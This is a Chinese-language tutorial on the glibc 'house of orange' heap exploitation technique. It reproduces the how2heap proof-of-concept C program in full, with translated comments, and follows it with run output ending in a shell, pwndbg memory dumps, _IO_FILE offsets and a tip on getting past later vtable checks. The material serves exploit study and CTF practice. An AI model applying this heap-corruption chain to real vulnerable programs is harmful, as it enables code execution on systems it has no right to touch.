
# how2heap之house of orange


                                阅读量   
                                **812729**
                            
                        |
                        
                                                                                                                                    ![](./img/197832/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/197832/t01e0c10f1efb991b6e.jpg)](./img/197832/t01e0c10f1efb991b6e.jpg)

> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
本文包含house of orange

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂



## 参考网站

```
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/
http://blog.angelboy.tw/
http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
```



## house of orange

### <a class="reference-link" name="%E5%BA%8F"></a>序

house of orange来自angelboy在hitcon 2016上出的一道题目,这个攻击方法并不单指本文所说的,而是指关于其一系列的伴生题目的漏洞利用技巧

其最主要的原理就是在没有free的情况下如何产生一个free状态的bins和io_file的利用

但最最最主要的利用是io_file的利用

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

这里我一行都没有删,仅仅加了注释

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner ( char *ptr);

int main()
{
    /*
      //house of orange
      //house of orange起源于一个在堆上有一个可以破坏top chunk的缓冲区溢出漏洞
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.

      //在开始的时候,整个heap都是top chunk的一部分
      At the beginning of execution, the entire heap is part of the Top chunk.
      //通常来说,第一次申请内存的时候会从top chunk中切出一部分来处理请求
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      //然后,随着我们不停的分配top chunk,top chunk会变得越来越小
      Thus, with every allocation, the Top chunks keeps getting smaller.
      //而在我们所申请的size比top chunk更大时会有两件事情发生
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
      //1.拓展top chunk,2.mmap一个新页
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    //在2.26的更改中,程序不在调用_IO_flush_all_lockp的malloc_printer的行为移除了我们攻击的媒介
    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).n");

    //由于对glibc 2.24 中 _IO_FILE vtable进行了白名单检查,因此这种攻击手段得到了抑制
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51n");

    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    /*
      //通常来说,堆是被一个大小为0x21000的top chunk所分配的
       The heap is usually allocated with a top chunk of size 0x21000
       //在我们分配了一个0x400的chunk后
       Since we've allocate a chunk of size 0x400 already,
       //我们剩下的大小为0x20c00,在prev_inuse位被设为1后,应该是0x20c01
       what's left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.

       //heap的边界是页对齐的.由于top chunk是对上的最后一个chunk,因此它在结尾也必须是页对齐的
       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.

       //并且,如果一个与top chunk,相邻的chunk被释放了.那么就会与top chunk合并.因此top chunk 的prev_inus位也一直被设置为1
       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
       //这也就意味着始终要满足两个条件
       So that means that there are two conditions that must always be true.
       //1) top chunk+size必须是页对齐的
        1) Top chunk + size has to be page aligned
        //2)top chunk的prev_inuse位必须为1
        2) Top chunk's prev_inuse bit has to be set.

       //如果我们将top chunk的size设为0xcc|PREV_INUSE的时候,所有的条件都会满足
       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       //我们剩下了0x20c01
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /*
       //现在我们需要一个比top chunk的size更大的chunk
       Now we request a chunk of size larger than the size of the Top chunk.
       //malloc会通过拓展top chunk来满足我们的需求
       Malloc tries to service this request by extending the Top chunk
       //这个会强制调用sysmalloc
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       //并且新分配的区域将于旧的heap的末尾相邻
       And the new area that gets allocated is contiguous to the old heap end.
       //因此top chunk的新size是旧的szie和新分配的size之和
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       //为了持续跟踪size的改变,malloc使用了一个fencepost chunk来作为一个临时的chunk
       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       //在top chunk的size被更新之后,这个chunk将会被Free
       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       //在这个情况下,新的top chunk将会在heap的末尾相邻处开始
       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       //因此这个在第二个chunk和heap结尾的区域之间是没有被使用的
       So the area between the second chunk and the heap end is unused.
       //但旧的top chunk却被释放了
       And the old Top chunk gets freed.
       //由于被释放的top chunk又比fastbin sizes要哒,他会被放进我们的unsorted bins中
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       //现在我们需要一个比top chunk更大的chunk
       Now we request a chunk of size larger than the size of the top chunk.
       //就会强行调用sysmalloc了
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
    /*
      //需要注意的是,上面的chunk会被分配到零一页中,它会被放到哦旧的heap的末尾
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      //现在我们就留下了那个被free掉的旧top chunk,他被放入了unsorted bin中
      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      //从这里开始就是攻击的第二阶段了,我们假设我们有了一个可以溢出到old top chunk的漏洞来让我们可以覆写chunk的size
      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      //第二段我们需要再次利用溢出来覆写在unsorted bin内chunk的fd和bk指针
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      //有两个常见的方法来利用当前的状态:
      There are two common ways to exploit the current state:
      //通过设置指针来造成任意地址分配(需要至少分配两次)
      //用chunk的unlink来写libc的main_arena unsorted-bin-list(需要至少一次分配)
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)
      //之前的攻击都很容易利用,因此这里我们只详细说明后者的一种变体,是由angelboy的博客上出来的一种变体
      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      //这个攻击炒鸡棒,因为它利用了终止调用,而终止调用原本是它检测到堆的任何虚假状态才会触发的
      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      //每当终止调用触发的时候,他都会通过调用_IO_flush_all_lockp刷新所有文件指针
      //最终会遍历_IO_list_all链表并调用_IO_OVERFLOW
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.

      //办法是通过一个fake pointer来覆写_IO_list_all指针,让_IO_OVERFLOW指向system函数并将其前8个字节设置为'/bin/sh',这样就会在调用_IO_OVERFLOW时调用system('/bin/sh')
      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      //_IO_list_all的地址可以通过free chunk的fd和bk指针来计算,当他们指向libc的main_arena的时候
      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    io_list_all = top[2] + 0x9a8;

    /*
      //我们计划来覆盖现在依旧被放到unsorted bins中old top的fd和bk指针
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      //当malloc尝试通过分解free chunk来满足请求的时候,chunk-&gt;bk-&gt;fd的值将会被libc的main_arena中的unsorted-bin-list地址覆盖
      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      //注意,这个覆写发生在完整性检查之前,因此可以发生在任意情况下
      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      //在这里,我们要求chunk-&gt;bk-&gt;fd指向_IO_list_all
      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.
      //因此,我们需要把chunk-&gt;bk设为_IO_list_all-16
      So, we should set chunk-&gt;bk to be _IO_list_all - 16
    */

    top[3] = io_list_all - 0x10;

    /*
      //在结尾的地方,system函数将会通过这个file指针来调用
      At the end, the system function will be invoked with the pointer to this file pointer.
      //如果我们将前8个字节设为 /bin/sh,他就会相当于system(/bin/sh)
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/shx00", 8);

    /*
      //_IO_flush_all_lockp函数遍历_IO_list_all指针链表
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      //由于我们仅仅可以通过main_arena的unsorted-bin-list来覆写这个地址,因此方法就时在对应的fd-ptr处控制内存
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      //下一个file指针在bass_address+0x68的位置
      The address of the next file pointer is located at base_address+0x68.
      //这个相对应的是smallbin-4,存储在90到98之间的smallbin的地方
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      //由于我们溢出了旧的top chunk,我们也就可以控制他的size域了
      Since we overflow the old top chunk, we also control it's size field.
      //这也就会有一个棘手的问题,我们的old top chunk现在是在unsorted bin list中的,在每个分配中,malloc都会尝试首先为该列表中的chunk来提供服务
      //因此这也将会遍历该链表
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      //此外,他也会把排序所有不符合的chunk并插入到对应的bins中去
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      //如果我们设置size为0x61并且触发一个不合适的更小的申请,malloc将会把old chunk放入到small bin-4中去
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      //由于这个bin现在是空的,因此old top chunk将会变成新的头部
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      //因此,old top chunk占据了main_arena中smallbin[4]的位置,并最终代表了fake file的fd-pter指针
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      //除了分类外,malloc也会对他们做一些某些大小的检查
      In addition to sorting, malloc will also perform certain size checks on them,
      //所以在分类old_top chunk和在伪造的fd指针指向_IO_list_all之后,他将会检查size域,检查 size是否小于最小的"size&lt;=2*SIZE_SZ"的
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size &lt;= 2 * SIZE_SZ"
      //并且最终触发终止调用来得到我们的链
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      //现在是我们满足函数_IO_flush_all_lockp所需的伪造文件指针约束并在此处进行测试的部分
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      //我们需要满足第一个状态
      We want to satisfy the first condition:
      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
    */

    _IO_FILE *fp = (_IO_FILE *) top;


    /*
      1. Set mode to 0: fp-&gt;_mode &lt;= 0
    */

    fp-&gt;_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
    */

    fp-&gt;_IO_write_base = (char *) 2; // top+0x20
    fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28


    /*
     //最后我们设置jump table去控制内存并将system放到这儿
      4) Finally set the jump table to controlled memory and place system there.
      //jump_table指针是正好在_IO_FILE结构体后面的
      The jump table pointer is right after the _IO_FILE struct:
      base_address+sizeof(_IO_FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &amp;top[12]; // controlled memory
    jump_table[3] = (size_t) &amp;winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8

    //现在让我们用malloc来触发整个链
    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{
    system(ptr);
    return 0;
}
```

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>运行结果

```
The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).
Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51
*** Error in `./house_of_orange': malloc(): memory corruption: 0x00007f83ceb58520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f83ce80a7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f83ce81513e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f83ce817184]
./house_of_orange[0x400788]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f83ce7b3830]
./house_of_orange[0x400589]
======= Memory map: ========
00400000-00401000 r-xp 00000000 fd:01 742055                             /root/how2heap/glibc_2.25/house_of_orange
00600000-00601000 r--p 00000000 fd:01 742055                             /root/how2heap/glibc_2.25/house_of_orange
00601000-00602000 rw-p 00001000 fd:01 742055                             /root/how2heap/glibc_2.25/house_of_orange
009a8000-009eb000 rw-p 00000000 00:00 0                                  [heap]
7f83c8000000-7f83c8021000 rw-p 00000000 00:00 0
7f83c8021000-7f83cc000000 ---p 00000000 00:00 0
7f83ce57d000-7f83ce593000 r-xp 00000000 fd:01 1839004                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f83ce593000-7f83ce792000 ---p 00016000 fd:01 1839004                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f83ce792000-7f83ce793000 rw-p 00015000 fd:01 1839004                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f83ce793000-7f83ce953000 r-xp 00000000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
7f83ce953000-7f83ceb53000 ---p 001c0000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
7f83ceb53000-7f83ceb57000 r--p 001c0000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
7f83ceb57000-7f83ceb59000 rw-p 001c4000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
7f83ceb59000-7f83ceb5d000 rw-p 00000000 00:00 0
7f83ceb5d000-7f83ceb83000 r-xp 00000000 fd:01 1838963                    /lib/x86_64-linux-gnu/ld-2.23.so
7f83ced75000-7f83ced78000 rw-p 00000000 00:00 0
7f83ced81000-7f83ced82000 rw-p 00000000 00:00 0
7f83ced82000-7f83ced83000 r--p 00025000 fd:01 1838963                    /lib/x86_64-linux-gnu/ld-2.23.so
7f83ced83000-7f83ced84000 rw-p 00026000 fd:01 1838963                    /lib/x86_64-linux-gnu/ld-2.23.so
7f83ced84000-7f83ced85000 rw-p 00000000 00:00 0
7ffd29f33000-7ffd29f54000 rw-p 00000000 00:00 0                          [stack]
7ffd29fb3000-7ffd29fb5000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
# ls
a.out                      fastbin_dup_into_stack.c  house_of_force.c  house_of_orange.c  large_bin_attack.c    overlapping_chunks_2.c  unsafe_unlink          unsorted_bin_into_stack
fastbin_dup_consolidate    house_of_einherjar        house_of_lore     house_of_spirit    overlapping_chunks    poison_null_byte        unsafe_unlink.c        unsorted_bin_into_stack.c
fastbin_dup_consolidate.c  house_of_einherjar.c      house_of_lore.c   house_of_spirit.c  overlapping_chunks.c  poison_null_byte.c      unsorted_bin_attack
fastbin_dup_into_stack     house_of_force            house_of_orange   large_bin_attack   overlapping_chunks_2  un2.c                   unsorted_bin_attack.c

```

### <a class="reference-link" name="%E8%B0%83%E8%AF%95"></a>调试

断点如下:

```
► 72     top = (size_t *) ( (char *) p1 + 0x400 - 16);
   73     top[1] = 0xc01;

   118
 ► 119     p2 = malloc(0x1000);

 ► 155     io_list_all = top[2] + 0x9a8;

 ► 172     top[3] = io_list_all - 0x10;

 ► 179     memcpy( ( char *) top, "/bin/shx00", 8);

 ► 211     top[1] = 0x61;

 ► 222     _IO_FILE *fp = (_IO_FILE *) top;

 ► 229     fp-&gt;_mode = 0; // top+0xc0

 ► 236     fp-&gt;_IO_write_base = (char *) 2; // top+0x20
   237     fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28

 ► 248     size_t *jump_table = &amp;top[12]; // controlled memory
   249     jump_table[3] = (size_t) &amp;winner;
   250     *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8

 ► 254     malloc(10);
```

首先程序分配了p1(0x400-16),此时的堆和top chunk

```
pwndbg&gt; x/10gx 0x602400
0x602400:       0x0000000000000000      0x0000000000020c01
0x602410:       0x0000000000000000      0x0000000000000000
0x602420:       0x0000000000000000      0x0000000000000000
0x602430:       0x0000000000000000      0x0000000000000000
0x602440:       0x0000000000000000      0x0000000000000000
```

然后我们把top_chunk的size伪造成0xc01

```
pwndbg&gt; x/10gx 0x602400
0x602400:       0x0000000000000000      0x0000000000000c01
0x602410:       0x0000000000000000      0x0000000000000000
0x602420:       0x0000000000000000      0x0000000000000000
0x602430:       0x0000000000000000      0x0000000000000000
0x602440:       0x0000000000000000      0x0000000000000000
```

下面申请一个较大的chunk p2

```
pwndbg&gt; bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602400
smallbins
empty
largebins
empty
```

这个时候可以看到我们的旧top chunk已经被放到了unsorted bin中下面

紧接着程序计算了IO_LIST_ALL的地址

```
pwndbg&gt; p/x &amp;_IO_list_all
$7 = 0x7ffff7dd2520
pwndbg&gt; p/x io_list_all
$8 = 0x7ffff7dd2520
```

并将old chunk的bk指针指向了_io_list_ptr-0x10

然后给top的前八个字节设为了”/bin/shx00”

```
pwndbg&gt; x/10gx 0x602400
0x602400:       0x0068732f6e69622f      0x0000000000000be1
0x602410:       0x00007ffff7dd1b78      0x00007ffff7dd2510
0x602420:       0x0000000000000000      0x0000000000000000
0x602430:       0x0000000000000000      0x0000000000000000
0x602440:       0x0000000000000000      0x0000000000000000

01:0008│      0x7fffffffe618 —▸ 0x602400 ◂— 0x68732f6e69622f /* '/bin/sh' */
```

现在我们把size设为0x61

```
pwndbg&gt; x/10gx 0x602400
0x602400:       0x0068732f6e69622f      0x0000000000000061
0x602410:       0x00007ffff7dd1b78      0x00007ffff7dd2510
0x602420:       0x0000000000000000      0x0000000000000000
0x602430:       0x0000000000000000      0x0000000000000000
0x602440:       0x0000000000000000      0x0000000000000000
```

之后程序对我们的旧的top chunk做了对绕过检测的改写,先将mode改为0

```
$20 = {
  _flags = 1852400175,
  _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
  _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; "20@b",
  _IO_read_base = 0x7ffff7dd2510 "",
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 '00',
  _shortbuf = "",
  _lock = 0x0,
  _offset = 0,
  __pad1 = 0x0,
  __pad2 = 0x0,
  __pad3 = 0x0,
  __pad4 = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '00' &lt;repeats 19 times&gt;
}
```

然后修改fp-&gt;_IO_write_base

```
$21 = {
  _flags = 1852400175,
  _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
  _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; "20@b",
  _IO_read_base = 0x7ffff7dd2510 "",
  _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 '00',
  _shortbuf = "",
  _lock = 0x0,
  _offset = 0,
  __pad1 = 0x0,
  __pad2 = 0x0,
  __pad3 = 0x0,
  __pad4 = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '00' &lt;repeats 19 times&gt;
}
```

随后修改了_IO_write_ptr

```
$22 = {
  _flags = 1852400175,
  _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
  _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; "20@b",
  _IO_read_base = 0x7ffff7dd2510 "",
  _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
  _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 '00',
  _shortbuf = "",
  _lock = 0x0,
  _offset = 0,
  __pad1 = 0x0,
  __pad2 = 0x0,
  __pad3 = 0x0,
  __pad4 = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '00' &lt;repeats 19 times&gt;
}
```

现在就只需要控制我们的jump_table就好了

```
pwndbg&gt; x/10gx top+12
0x602460:       0x0000000000000000      0x0000000000000000
0x602470:       0x0000000000000000      0x000000000040078f
0x602480:       0x0000000000000000      0x0000000000000000
0x602490:       0x0000000000000000      0x0000000000000000
0x6024a0:       0x0000000000000000      0x0000000000000000
```

先将我们的jump_table伪造成0x40078f,然后赋值给我们的jump_table

```
$27 = {
  file = {
    _flags = 1852400175,
    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; "20@b",
    _IO_read_base = 0x7ffff7dd2510 "",
    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 4196239,
    _cur_column = 0,
    _vtable_offset = 0 '00',
    _shortbuf = "",
    _lock = 0x0,
    _offset = 0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '00' &lt;repeats 19 times&gt;
  },
  vtable = 0x602460
}
```

现在再调用malloc因为会检测size,由于 size&lt;= 2*SIZE_SZ,所以会触发 _IO_flush_all_lockp 中的 _IO_OVERFLOW 函数，虽然继续报错,但我们还是 get shell了



## 总结

house of orange的运用一共有两个阶段

第一个阶段是在不使用free的情况下获取我们的free chunk

第二个阶段是伪造我们的vtable

首先,程序写了一个winner函数,该函数作用就是调用system函数

然后程序申请了chunk p1(0x400-16)

此时系统的top chunk大小为0x20c01

因为top chunk需要页对齐并且其PRE_INUSE标志位始终为1,因此我们将我们的size改成了0xc01

现在申请一个0x1000的chunk,系统就会开一个新页来存储我们的新chunk,而我们的旧的top chunk会被放入到unsorted bin中

好了,现在我们有了unsorted bin,下面可以开始伪造我们的file结构指针了

在第二阶段前,我们先将旧top chunk的size改成0x61

第二阶段中,程序先是把旧的top chunk-&gt;bk-&gt;fd指针指向了_io_list_ptr

为了绕过检测,我们首先要绕过两个检查

一个是_mode必须为0,另一个是_write_base&lt;_write_ptr

所以程序将我们伪造的_IO_write_base改为2,_IO_write_ptr改为3

然后把我们的jump_table指向winner函数,将top的前8个字节改成了”/bin/sh”

最后让我们的vtable指向jump_table

现在再次调用malloc函数,由于size无法通过检测,因此,程序会终止调用,从而触发我们构造好的链

于是,程序输出错误信息的同时,我们也拿到了shell

over~

最后,附上结构和偏移

结构:

```
struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
```

偏移

```
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

IO_jump_t *vtable:

```
void * funcs[] = {
   1 NULL, // "extra word"
   2 NULL, // DUMMY
   3 exit, // finish
   4 NULL, // overflow
   5 NULL, // underflow
   6 NULL, // uflow
   7 NULL, // pbackfail

   8 NULL, // xsputn  #printf
   9 NULL, // xsgetn
   10 NULL, // seekoff
   11 NULL, // seekpos
   12 NULL, // setbuf
   13 NULL, // sync
   14 NULL, // doallocate
   15 NULL, // read
   16 NULL, // write
   17 NULL, // seek
   18 pwn,  // close
   19 NULL, // stat
   20 NULL, // showmanyc
   21 NULL, // imbue
};
```

在libc版本&gt;2.23后虽然加了检测机制,但我们依旧可以通过改 vtable为 _IO_str_jump来绕过检测,将偏移0xe0处设置为one_gadget即可
